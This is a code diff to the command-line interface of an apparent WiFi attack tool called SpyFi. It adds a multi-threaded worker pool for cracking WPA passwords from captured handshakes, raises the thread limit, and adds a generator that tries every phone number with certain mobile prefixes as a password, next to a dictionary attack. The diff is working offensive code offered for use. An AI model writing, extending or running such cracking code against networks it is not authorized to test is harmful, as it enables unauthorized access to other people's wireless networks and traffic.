@@ -1,11 +1,13 @@
 //! # cli
-//! `cli` is a command line tool to control SpyFi. It allows you to 
+// ! `cli` is a command line tool to control SpyFi. It allows you to 
 //!  find nearest networks and perform actions such as disconnect them 
 //! from the WiFi.
 
 use std::{io::{BufRead,BufReader}, collections::HashMap};
+use std::{sync::mpsc,thread};
 use clap::{Parser, ValueEnum, Args, Subcommand};
 use wlan;
+use aux::{IPC,IPCMessage};
 use wpa::{self, NetworkInfo};
 use crypto;
 use pcap;
@@ -219,8 +221,8 @@ struct Attack{
     capture: Option<String>,
 
     ///number of threads to use for dictionary/bruteforce attack
-    #[arg(short,long,default_value_t=1,value_parser = clap::value_parser!(u8).range(1..100))]
-    threads:u8,
+    #[arg(short,long,default_value_t=1,value_parser = clap::value_parser!(u32).range(1..201))]
+    threads:u32,
 
     ///regex pattern for bruteforce
     //#[arg(long)]
@@ -257,8 +259,13 @@ struct Attack{
     sweep:bool,
 
     ///wordlist
-    #[arg(long,required_if_eq("ATTACKTYPE","dict"))]
+    //TODO: require wordlist or phones
+    #[arg(long,group="dict")]
     wordlist: Option<String>,
+    
+    ///phonenumbers generator
+    #[arg(long,group="dict")]
+    phones: bool,
 }
 
 
@@ -317,16 +324,95 @@ impl Attack{
                             return;
                         } 
                     }        
+                   
+                    let mut threads:Vec<IPC<String>> = vec![];
+                    // create threads pool
+                    for _ in 0..self.threads{
+                        let (thread_tx,main_rx) = mpsc::channel();
+                        let (main_tx,thread_rx) = mpsc::channel(); 
 
-                    // read passwords from dictionary
-                    let wordlist = self.wordlist.as_ref().unwrap();
-                    let path = std::fs::File::open(&self.wordlist.as_ref().unwrap()).unwrap();
-                    let reader = BufReader::new(path);
-                    for line in reader.lines(){
-                        println!("[-] trying: {}",line.as_ref().unwrap());
-                        if hs.as_ref().unwrap().clone().try_password(line.as_ref().unwrap()){
-                            println!("[+] password is: {}",line.as_ref().unwrap());
-                            return ;
+                        let main_ipc:IPC<String> = IPC{
+                            tx: main_tx,
+                            rx: main_rx,
+                        };
+
+                        let thread_ipc:IPC<String> = IPC{
+                            tx: thread_tx,
+                            rx: thread_rx,
+                        };
+                        
+                        threads.push(main_ipc);
+                        let hs_cpy = hs.as_ref().unwrap().clone();
+                        thread::spawn(move||{
+                            wpa::password_worker(thread_ipc,hs_cpy);
+                        });
+                    }
+                    
+                    let mut jobs_count = 0;
+                    let mut next_thread: i32 = 0;
+                    //TODO:make it the right way
+                    if self.phones{
+
+                        let prefixes = vec!["050","052","053","054","057"];
+                        for prefix in &prefixes{
+                            for i in 0..10e7 as i32 {
+                                let passwd = format!("{}{:0>7}",prefix,i).to_owned();
+                                jobs_count += 1;
+                                threads[next_thread as usize].tx.send(IPCMessage::Message(passwd.to_owned()));
+                                next_thread = aux::modulos(next_thread+1, threads.len() as i32);
+                            }
+                        }
+
+                    }else{
+
+                        // read passwords from dictionary
+                        let wordlist = self.wordlist.as_ref().unwrap();
+                        let path = std::fs::File::open(&self.wordlist.as_ref().unwrap()).unwrap();
+                        let reader = BufReader::new(path);
+                        
+                        
+                        for line in reader.lines(){
+                            let line = match line.as_ref(){
+                                Ok(pass) => {
+                                    if pass.len() < 8{
+                                        println!("[-] invalid size: {}",pass);
+                                        continue;
+                                    }
+                                    pass
+                                },
+                                Err(_) => {continue}
+                            };
+                            jobs_count += 1;
+                            threads[next_thread as usize].tx.send(IPCMessage::Message(line.to_owned()));
+                            next_thread = aux::modulos(next_thread+1, threads.len() as i32);
+                        }
+                    }
+
+
+                    while jobs_count > 0{
+                        for thread in &threads{
+                            if let Ok(ipc_msg) = thread.rx.try_recv(){
+                                match ipc_msg{
+                                    IPCMessage::Message(msg) =>{
+                                        match msg.as_str(){
+                                            "wrong" =>{
+                                                jobs_count -= 1;
+                                            },
+                                            _ =>{
+                                                println!("[+] Found password: {}",msg);
+                                                //kill all threads
+                                                for thread in &threads{
+                                                    thread.tx.send(IPCMessage::EndCommunication);
+                                                }
+                                                return;
+                                            }
+                                        }
+                                    },
+                                    _ =>{
+                                        continue;
+                                    }
+                                }
+                            }        
                         }
                     }
                     println!("[!] Exhausted.")
